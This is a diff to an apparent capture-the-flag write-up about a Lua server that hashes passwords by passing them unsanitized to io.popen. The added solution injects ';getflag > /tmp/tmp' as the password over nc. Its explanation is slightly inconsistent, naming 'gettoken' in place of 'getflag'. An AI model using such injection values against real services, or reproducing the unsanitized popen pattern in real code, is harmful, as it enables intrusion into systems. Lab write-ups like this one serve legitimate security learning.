@@ -23,6 +23,7 @@ local server = assert(socket.bind("127.0.0.1", 5151))
                              🟡 localhost:5151 ^^^^
 function hash(pass)
   prog = io.popen("echo "..pass.." | sha1sum", "r")
+            ^^^^^ 🟡 prone to command injection
   data = prog:read("*all")
   prog:close()
   data = string.sub(data, 1, 40)
@@ -55,4 +56,20 @@ stack traceback:
 	[C]: ?
 ```
 
-# _todo_
+Vulnerability: `io.popen()`
+- `popen` opens a shell run an entire command
+- var `pass` being concated w/o sanitization make it prone to injection
+
+Solution
+```b
+> nc localhost 5151
+Password: ;getflag > /tmp/tmp
+```
+Then lua evals it like this:
+```b
+echo ;gettoken > /tmp/tmp | sha1sum
+
+# `;` halt ends the echo
+# `| sha1sum` this part is discarded
+# all it does is redir the token to /tmp/tmp
+```
